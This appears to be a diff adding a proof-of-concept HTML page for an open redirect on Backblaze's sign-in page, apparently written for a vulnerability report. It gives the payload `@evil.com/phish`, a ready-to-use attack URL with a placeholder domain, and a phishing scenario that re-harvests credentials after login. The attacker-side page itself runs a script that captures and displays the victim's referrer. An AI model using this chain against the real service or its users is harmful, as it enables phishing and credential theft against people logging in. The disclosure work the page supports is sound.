@@ -1,0 +1,175 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Open Redirect + Referrer Leak PoC</title>
+  <!-- Allow full referrer to be sent TO this page (default browser behavior) -->
+  <!-- This meta tag ensures we RECEIVE the referrer from the redirecting page -->
+  <meta name="referrer" content="always">
+  <style>
+    body {
+      font-family: monospace;
+      background: #1a1a2e;
+      color: #0f0;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    h1 { color: #e94560; }
+    h2 { color: #f0a500; margin-top: 30px; }
+    .info { color: #ccc; }
+    .critical { color: #e94560; font-weight: bold; }
+    .status { color: #5EB583; font-weight: bold; }
+    .section {
+      border: 1px solid #333;
+      padding: 15px;
+      margin: 15px 0;
+      background: #0d0d1a;
+    }
+    code { color: #f0a500; background: #0d0d1a; padding: 2px 6px; }
+    pre {
+      background: #0d0d1a;
+      border: 1px solid #333;
+      padding: 10px;
+      overflow-x: auto;
+      color: #ccc;
+    }
+    table { border-collapse: collapse; margin: 10px 0; width: 100%; }
+    th, td { border: 1px solid #333; padding: 8px 12px; text-align: left; }
+    th { background: #16213e; color: #f0a500; }
+    td { color: #ccc; }
+    .leak { color: #e94560; font-size: 16px; word-break: break-all; }
+    #referrer-box {
+      border: 2px solid #e94560;
+      padding: 15px;
+      margin: 15px 0;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+<h1>Open Redirect + Referrer Leak PoC</h1>
+<p class="info">This page captures the HTTP Referer header leaked after the open redirect.</p>
+
+<!-- ============================================================ -->
+<div class="section">
+  <h2>Vulnerability</h2>
+  <table>
+    <tr><th>Type</th><td>Open Redirect (Post-Authentication)</td></tr>
+    <tr><th>Endpoint</th><td><code>https://secure.backblaze.com/user_signin.htm</code></td></tr>
+    <tr><th>Parameter</th><td><code>redirect_to</code></td></tr>
+    <tr><th>Payload</th><td><code>@evil.com/phish</code></td></tr>
+    <tr><th>Constructed URL</th><td><code>https://secure.backblaze.com@evil.com/phish</code></td></tr>
+    <tr><th>Trigger</th><td>User enters valid credentials &rarr; successful login &rarr; redirect fires</td></tr>
+  </table>
+
+  <h3 style="color:#f0a500">How it works:</h3>
+  <pre>
+// sign-in_20.887bee51ff7432a1c813.min.js
+
+// 1. redirect_to is read from URL query parameter (line 912)
+var a = f(window, "redirect_to");   // a = "@evil.com/phish"
+
+// 2. On successful login (line 364-365):
+e.location.href = "https://secure.backblaze." + v(e) + a;
+//                 "https://secure.backblaze."  + "com"  + "@evil.com/phish"
+//               = "https://secure.backblaze.com@evil.com/phish"
+//
+// Browser parses this as:
+//   scheme:   https
+//   userinfo: secure.backblaze.com    (ignored by browser)
+//   host:     evil.com
+//   path:     /phish
+  </pre>
+</div>
+
+<!-- ============================================================ -->
+<div class="section">
+  <h2>Captured Referrer</h2>
+  <div id="referrer-box">
+    <span class="info">Checking...</span>
+  </div>
+
+  <table id="results-table">
+    <tr><th>Field</th><th>Value</th></tr>
+    <tr><td>document.referrer</td><td id="ref-value" class="leak">-</td></tr>
+    <tr><td>Referrer Origin</td><td id="ref-origin" class="leak">-</td></tr>
+    <tr><td>Referrer Path</td><td id="ref-path" class="leak">-</td></tr>
+    <tr><td>Current URL</td><td id="current-url" class="info">-</td></tr>
+    <tr><td>Timestamp</td><td id="timestamp" class="info">-</td></tr>
+  </table>
+</div>
+
+<!-- ============================================================ -->
+<div class="section">
+  <h2>Impact</h2>
+  <p class="info">When a user is redirected here after login, the browser sends the <code>Referer</code> header
+  containing the previous page URL. Depending on the browser's referrer policy, this can leak:</p>
+  <ul class="info">
+    <li>The full URL including <code>secure.backblaze.com</code> origin</li>
+    <li>Session tokens or sensitive parameters if present in the URL</li>
+    <li>Confirmation that the user has a Backblaze account</li>
+    <li>The user just entered valid credentials on the real login page (social engineering value)</li>
+  </ul>
+
+  <h3 style="color:#f0a500">Attack scenario:</h3>
+  <ol class="info">
+    <li>Attacker sends victim a link:
+      <code>https://secure.backblaze.com/user_signin.htm?redirect_to=@evil.com/phish</code></li>
+    <li>Victim sees the <strong>real</strong> Backblaze login page at <code>secure.backblaze.com</code></li>
+    <li>Victim enters valid credentials and logs in</li>
+    <li>After successful authentication, the app redirects to <code>https://secure.backblaze.com@evil.com/phish</code></li>
+    <li>Browser navigates to <code>evil.com/phish</code> â€” this page captures the referrer</li>
+    <li>Attacker's page could show a fake "session expired" message to phish credentials again</li>
+  </ol>
+</div>
+
+<!-- ============================================================ -->
+<div class="section">
+  <h2>Reproduce</h2>
+  <p class="info">Full attack URL (replace <code>evil.com</code> with your server hosting this page):</p>
+  <pre id="attack-url">https://secure.backblaze.com/user_signin.htm?redirect_to=@YOUR_DOMAIN/poc_openredirect_referer.html</pre>
+</div>
+
+<script>
+  // Capture and display referrer
+  var referrer = document.referrer;
+  var box = document.getElementById('referrer-box');
+  var refValue = document.getElementById('ref-value');
+  var refOrigin = document.getElementById('ref-origin');
+  var refPath = document.getElementById('ref-path');
+  var currentUrl = document.getElementById('current-url');
+  var timestamp = document.getElementById('timestamp');
+
+  currentUrl.textContent = window.location.href;
+  timestamp.textContent = new Date().toISOString();
+
+  if (referrer && referrer.length > 0) {
+    box.innerHTML = '<span class="status">REFERRER CAPTURED</span>';
+    refValue.textContent = referrer;
+
+    try {
+      var refUrl = new URL(referrer);
+      refOrigin.textContent = refUrl.origin;
+      refPath.textContent = refUrl.pathname + refUrl.search;
+    } catch(e) {
+      refOrigin.textContent = '(parse error)';
+      refPath.textContent = '(parse error)';
+    }
+  } else {
+    box.innerHTML = '<span class="critical">NO REFERRER</span> â€” ' +
+      '<span class="info">The referrer was stripped. This can happen if:</span>' +
+      '<ul class="info">' +
+      '<li>The redirect page sets <code>Referrer-Policy: no-referrer</code></li>' +
+      '<li>The redirect is HTTPS &rarr; HTTP (downgrade strips referrer by default)</li>' +
+      '<li>You opened this page directly (not via redirect)</li>' +
+      '</ul>';
+    refValue.textContent = '(empty)';
+    refOrigin.textContent = '(empty)';
+    refPath.textContent = '(empty)';
+  }
+</script>
+
+</body>
+</html>
